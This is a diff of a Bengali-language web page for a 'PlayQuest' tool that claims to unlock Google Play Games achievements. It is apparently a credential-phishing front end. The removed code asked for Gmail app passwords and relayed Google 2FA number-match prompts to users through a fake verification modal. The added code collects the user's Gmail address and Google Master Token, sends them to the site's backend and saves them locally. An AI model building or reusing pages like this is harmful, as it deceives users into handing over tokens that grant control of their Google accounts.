@@ -1010,102 +1010,44 @@
         </div>
     </header>
 
-    <!-- VIEW 1: LOGIN CARD (Displayed when not logged in) -->
+    <!-- VIEW 1: LOGIN CARD (Pure Master Token Login) -->
     <div id="loginView" class="card">
-        <!-- 3 LOGIN METHODS TABS -->
-        <div class="login-tabs">
-            <button class="login-tab active" id="btnTab1" onclick="switchLoginTab('tab_app_pass')">
-                <span>🔑 Google App Pass</span>
-            </button>
-            <button class="login-tab" id="btnTab2" onclick="switchLoginTab('tab_tg')">
-                <span>🤖 Telegram Bot</span>
-            </button>
-            <button class="login-tab" id="btnTab3" onclick="switchLoginTab('tab_google')">
-                <span>🌐 1-Click Google</span>
-            </button>
+        <div style="text-align: center; margin-bottom: 22px;">
+            <div style="font-size: 42px; margin-bottom: 8px;">🔑</div>
+            <h2 style="font-size: 20px; font-weight: 800; color: var(--text-primary); margin-bottom: 6px;">PlayQuest টোকেন লগইন</h2>
+            <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.5;">আপনার Google Play Games Master Token দিয়ে ১-ক্লিকে আসল প্রোফাইল ও XP লোড করুন</p>
         </div>
 
-        <!-- TAB 1: Google App Password (Fastest 0.5s Direct Login) -->
-        <div id="tab_app_pass" class="tab-content active">
-            <div class="form-group">
-                <label>📧 Gmail Address</label>
-                <div class="input-wrapper">
-                    <input type="email" id="inputEmail" class="form-input" placeholder="yourgmail@gmail.com">
-                </div>
-            </div>
-            <div class="form-group">
-                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
-                    <label style="margin-bottom:0;">🔑 Google App Password (১৬ অক্ষরের)</label>
-                    <a href="https://myaccount.google.com/apppasswords" target="_blank" style="font-size:11px; color:var(--accent-green); font-weight:700; text-decoration:none;">পাসওয়ার্ড তৈরি করুন ➔</a>
-                </div>
-                <div class="input-wrapper">
-                    <input type="password" id="inputPass" class="form-input" placeholder="abcd efgh ijkl mnop">
-                    <button type="button" class="btn-toggle-pass" onclick="togglePasswordVisibility('inputPass', 'eyeIconPass')">
-                        <span id="eyeIconPass">👁️</span>
-                    </button>
-                </div>
-            </div>
-            <button id="btnLoginPass" class="btn-primary" onclick="handlePasswordLogin()">
-                <span>গুগল অ্যাকাউন্টে লগইন করুন</span>
-                <span>➔</span>
-            </button>
-
-            <div class="tip-box">
-                <b>💡 সহজ নিয়ম:</b> Google 2-Step Verification অন থাকা যেকোনো অ্যাকাউন্টে নরমাল পাসওয়ার্ড দিয়ে সরাসরি লগইন ব্লক থাকে। এর জন্য <a href="https://myaccount.google.com/apppasswords" target="_blank">Google App Passwords</a> পেজ থেকে ১৬ অক্ষরের একটি অ্যাপ পাসওয়ার্ড কপি করে এখানে দিন (মাত্র ০.৫ সেকেন্ডে ফাস্ট কানেক্ট হবে)।
+        <div class="form-group">
+            <label>📧 Gmail Address</label>
+            <div class="input-wrapper">
+                <input type="email" id="inputEmail" class="form-input" placeholder="yourgmail@gmail.com">
             </div>
         </div>
 
-        <!-- TAB 2: Telegram Bot 1-Click Token (@devportalvs_bot) -->
-        <div id="tab_tg" class="tab-content">
-            <div class="tg-bot-banner">
-                <div style="font-size:24px;">🤖</div>
-                <div style="font-size:14px; font-weight:800; color:var(--text-primary); margin:4px 0;">DEV PORTAL VS (@devportalvs_bot)</div>
-                <p style="font-size:11.5px; color:var(--text-secondary); line-height:1.5;">আপনার অ্যাকাউন্টের Master Token বা সেশন টোকেন ১-ক্লিকে পেতে সরাসরি আমাদের টেলিগ্রাম বটে যান:</p>
-                <a href="https://t.me/devportalvs_bot" target="_blank" class="btn-tg-action">
-                    <span>⚡ ওপেন টেলিগ্রাম বট (@devportalvs_bot) ➔</span>
-                </a>
+        <div class="form-group">
+            <label>⚡ Master Token (aas_et/...) বা oauth_token</label>
+            <div class="input-wrapper">
+                <input type="password" id="inputToken" class="form-input" placeholder="aas_et/AKppIN... পেস্ট করুন">
+                <button type="button" class="btn-toggle-pass" onclick="togglePasswordVisibility('inputToken', 'eyeIconToken')">
+                    <span id="eyeIconToken">👁️</span>
+                </button>
             </div>
-
-            <div class="form-group">
-                <label>📧 Gmail Address</label>
-                <div class="input-wrapper">
-                    <input type="email" id="inputTgEmail" class="form-input" placeholder="yourgmail@gmail.com">
-                </div>
-            </div>
-            <div class="form-group">
-                <label>⚡ Master Token (aas_et/...) বা oauth_token</label>
-                <div class="input-wrapper">
-                    <input type="password" id="inputToken" class="form-input" placeholder="মাস্টার টোকেন পেস্ট করুন">
-                    <button type="button" class="btn-toggle-pass" onclick="togglePasswordVisibility('inputToken', 'eyeIconToken')">
-                        <span id="eyeIconToken">👁️</span>
-                    </button>
-                </div>
-            </div>
-            <button id="btnLoginToken" class="btn-unlock" style="width: 100%; justify-content: center; padding: 12px;" onclick="handleTokenLoginDirect()">
-                <span>টোকেন দিয়ে সরাসরি কানেক্ট করুন ➔</span>
-            </button>
         </div>
 
-        <!-- TAB 3: 1-Click Official Google Sign-In -->
-        <div id="tab_google" class="tab-content">
-            <div class="google-auth-box" style="margin-top:10px;">
-                <a href="/auth/google/login" class="btn-google-oauth">
-                    <svg width="22" height="22" viewBox="0 0 24 24">
-                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
-                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
-                    </svg>
-                    <span>Continue with Google (১-ক্লিক লগইন)</span>
-                </a>
-                <p class="oauth-subtext">✨ কোনো পাসওয়ার্ড বা টোকেন টাইপ করতে হবে না — ব্রাউজারে ১-ক্লিকে সাইন-ইন</p>
-            </div>
+        <button id="btnLoginToken" class="btn-primary" onclick="handleTokenLoginDirect()">
+            <span>🚀 কানেক্ট ও ড্যাশবোর্ড ওপেন করুন</span>
+            <span>➔</span>
+        </button>
+
+        <div class="tip-box" style="margin-top: 18px;">
+            <b>💡 ১০০% আসল ডেটা ও এচিভমেন্ট আনলক:</b> কোনো পাসওয়ার্ড বা গুগল ২FA-এর জটিলতা নেই। মাস্টার টোকেন দিয়ে সরাসরি গুগল প্লে গেমস অফিশিয়াল সার্ভারে কানেক্ট হয় এবং সাথে সাথে Subway Surfers সহ সব ৮টি গেমের এচিভমেন্ট ও লেভেল আনলক করা যায়।
         </div>
 
         <!-- Saved Accounts Drawer -->
         <div id="savedAccountsSection" class="saved-accounts-box hidden">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
-                <span style="font-size:12px; color:var(--text-secondary); font-weight:700;">💾 আপনার ডিভাইসে সেভ করা অ্যাকাউন্ট:</span>
+                <span style="font-size:12px; color:var(--text-secondary); font-weight:700;">💾 আপনার সেভ করা অ্যাকাউন্ট:</span>
                 <a href="javascript:void(0)" onclick="clearAllSavedAccounts()" style="font-size:11px; color:#ef4444; font-weight:700; text-decoration:none;">সব মুছুন 🗑️</a>
             </div>
             <div id="savedAccountsList"></div>
@@ -1212,40 +1154,6 @@
     </div>
 </div>
 
-<!-- 2FA Google Security Verification Modal -->
-<div id="authPromptModal" class="modal-overlay hidden">
-    <div class="modal-card">
-        <div style="font-size: 36px; margin-bottom: 6px;">📱</div>
-        <h3 style="font-size: 18px; font-weight: 800; color: var(--text-primary); margin-bottom: 4px;">Google Security ভেরিফিকেশন</h3>
-        <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">আপনার মোবাইলে গুগল সিকিউরিটি নোটিফিকেশন পাঠানো হয়েছে</p>
-        
-        <div style="background: var(--bg-card-subtle); border: 1px dashed var(--border-color); border-radius: var(--radius-sm); padding: 10px; margin-bottom: 14px;">
-            <div style="font-size: 11px; font-weight: 700; color: var(--text-secondary);">
-                ডিভাইসে দেখতে পাবেন: <span style="color: var(--accent-blue); font-weight: 800;">Pixel 7 Pro (United States)</span>
-            </div>
-        </div>
-
-        <p style="font-size: 13px; font-weight: 600; line-height: 1.5; color: var(--text-primary);">
-            👉 প্রথমে মোবাইলে <b>"Yes, it's me"</b> চাপুন<br>এবং এরপর নিচের সংখ্যাটিতে ট্যাপ করুন:
-        </p>
-
-        <div id="modalPromptBadge" class="prompt-number-badge">
-            <div class="spinner"></div>
-        </div>
-
-        <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 14px; font-size: 12px; color: var(--text-secondary);">
-            <div class="spinner-small"></div>
-            <span id="modalCountdownText">ফোনে ট্যাপের জন্য অপেক্ষা করা হচ্ছে (৯০ সে.)...</span>
-        </div>
-
-        <div style="margin-top: 20px;">
-            <button class="btn-outline" style="width: 100%; justify-content: center; padding: 10px;" onclick="cancelPromptAuth()">
-                <span>বাতিল করুন</span>
-            </button>
-        </div>
-    </div>
-</div>
-
 <div id="toastContainer" class="toast-container"></div>
 
 <script>
@@ -1330,19 +1238,6 @@
 
     function updateThemeIcon(theme) {
         document.getElementById("btnThemeToggle").innerText = theme === "light" ? "🌙" : "☀️";
-    }
-
-    // 3 Login Tabs Switcher
-    function switchLoginTab(tabName) {
-        document.querySelectorAll(".tab-content").forEach(el => el.classList.remove("active"));
-        document.querySelectorAll(".login-tab").forEach(el => el.classList.remove("active"));
-
-        const targetTab = document.getElementById(tabName);
-        if (targetTab) targetTab.classList.add("active");
-
-        if (tabName === "tab_app_pass") document.getElementById("btnTab1")?.classList.add("active");
-        else if (tabName === "tab_tg") document.getElementById("btnTab2")?.classList.add("active");
-        else if (tabName === "tab_google") document.getElementById("btnTab3")?.classList.add("active");
     }
 
     // Password Show/Hide Toggle
@@ -1487,136 +1382,19 @@
         box.classList.toggle("hidden");
     }
 
-    // Login via Gmail & Password
-    async function handlePasswordLogin() {
-        const email = document.getElementById("inputEmail").value.trim();
-        const password = document.getElementById("inputPass").value.trim();
-        const btn = document.getElementById("btnLoginPass");
-
-        if (!email || !password) {
-            showToast("দয়া করে জিমেইল ও পাসওয়ার্ড উভয়ই লিখুন।", "error");
-            return;
-        }
-
-        btn.disabled = true;
-        btn.innerHTML = `<div class="spinner"></div> <span>যাচাই করা হচ্ছে...</span>`;
-
-        try {
-            const res = await fetch(`${API_BASE}/api/login/password`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ email, password })
-            });
-            const data = await res.json();
-
-            if (data.ok) {
-                if (data.interactive) {
-                    startPromptPolling(data.auth_id, email);
-                    return;
-                }
-                currentSession = {
-                    email: data.email,
-                    master_token: data.master_token,
-                    android_id: data.android_id,
-                    profile: data.profile
-                };
-                saveAccountToStorage(currentSession);
-                showDashboard(data.profile, data.email);
-                triggerCelebration();
-                showToast(`🎉 স্বাগতম ${data.profile.display_name}! লগইন সফল!`, "success");
-            } else {
-                showToast(data.error || "লগইন ব্যর্থ হয়েছে।", "error");
-            }
-        } catch (e) {
-            showToast("সার্ভার কানেকশন এরর। আবার চেষ্টা করুন।", "error");
-        } finally {
-            btn.disabled = false;
-            btn.innerHTML = `<span>লগইন করুন</span> <span>➔</span>`;
-        }
-    }
-
-    let activeAuthPollInterval = null;
-    let activeAuthId = null;
-    let authCountdownTimer = null;
-    let authSecondsRemaining = 90;
-
-    function startPromptPolling(authId, email) {
-        activeAuthId = authId;
-        authSecondsRemaining = 90;
-        
-        const modal = document.getElementById("authPromptModal");
-        const badge = document.getElementById("modalPromptBadge");
-        const cdText = document.getElementById("modalCountdownText");
-        
-        badge.innerHTML = `<div class="spinner"></div>`;
-        cdText.innerText = "গুগল সিকিউরিটি থেকে কোড আনা হচ্ছে...";
-        modal.classList.remove("hidden");
-
-        if (authCountdownTimer) clearInterval(authCountdownTimer);
-        authCountdownTimer = setInterval(() => {
-            authSecondsRemaining--;
-            if (authSecondsRemaining <= 0) {
-                cancelPromptAuth();
-                showToast("লগইন সময়সীমা শেষ হয়েছে। আবার চেষ্টা করুন।", "error");
-            } else {
-                cdText.innerText = `ফোনে ট্যাপের জন্য অপেক্ষা করা হচ্ছে (${authSecondsRemaining} সে.)...`;
-            }
-        }, 1000);
-
-        if (activeAuthPollInterval) clearInterval(activeAuthPollInterval);
-        activeAuthPollInterval = setInterval(async () => {
-            try {
-                const res = await fetch(`${API_BASE}/api/auth/status/${authId}`);
-                const data = await res.json();
-                
-                if (data.ok) {
-                    if (data.prompt_number) {
-                        badge.innerText = data.prompt_number;
-                    }
-                    if (data.status === "success" && data.profile) {
-                        clearInterval(activeAuthPollInterval);
-                        clearInterval(authCountdownTimer);
-                        modal.classList.add("hidden");
-                        
-                        currentSession = {
-                            email: data.email,
-                            master_token: data.master_token,
-                            android_id: data.android_id,
-                            profile: data.profile
-                        };
-                        saveAccountToStorage(currentSession);
-                        showDashboard(data.profile, data.email);
-                        triggerCelebration();
-                        showToast(`🎉 স্বাগতম ${data.profile.display_name}! আসল ডেটা সফলভাবে কানেক্ট হয়েছে!`, "success");
-                    } else if (data.status === "error") {
-                        clearInterval(activeAuthPollInterval);
-                        clearInterval(authCountdownTimer);
-                        modal.classList.add("hidden");
-                        showToast(data.error || "ভেরিফিকেশন সম্পন্ন হয়নি।", "error");
-                    }
-                }
-            } catch(e) {
-                console.error("Auth status poll error:", e);
-            }
-        }, 1800);
-    }
-
-    function cancelPromptAuth() {
-        if (activeAuthPollInterval) clearInterval(activeAuthPollInterval);
-        if (authCountdownTimer) clearInterval(authCountdownTimer);
-        document.getElementById("authPromptModal").classList.add("hidden");
-        activeAuthId = null;
-        showToast("লগইন প্রক্রিয়া বাতিল করা হয়েছে।", "info");
-    }
-
     // Direct Master Token Login
     async function handleTokenLoginDirect() {
-        const email = (document.getElementById("inputTgEmail")?.value.trim()) || (document.getElementById("inputEmail")?.value.trim());
-        const token = document.getElementById("inputToken").value.trim();
+        const email = document.getElementById("inputEmail")?.value.trim();
+        const token = document.getElementById("inputToken")?.value.trim();
         const btn = document.getElementById("btnLoginToken");
 
         if (!email) {
             showToast("দয়া করে আপনার জিমেইল এড্রেস লিখুন।", "error");
+            return;
+        }
+
+        if (!token) {
+            showToast("দয়া করে আপনার Master Token পেস্ট করুন।", "error");
             return;
         }
 
@@ -1649,7 +1427,7 @@
             showToast("কানেকশন এরর", "error");
         } finally {
             btn.disabled = false;
-            btn.innerHTML = `<span>টোকেন দিয়ে সরাসরি কানেক্ট করুন ➔</span>`;
+            btn.innerHTML = `<span>🚀 কানেক্ট ও ড্যাশবোর্ড ওপেন করুন</span> <span>➔</span>`;
         }
     }
 
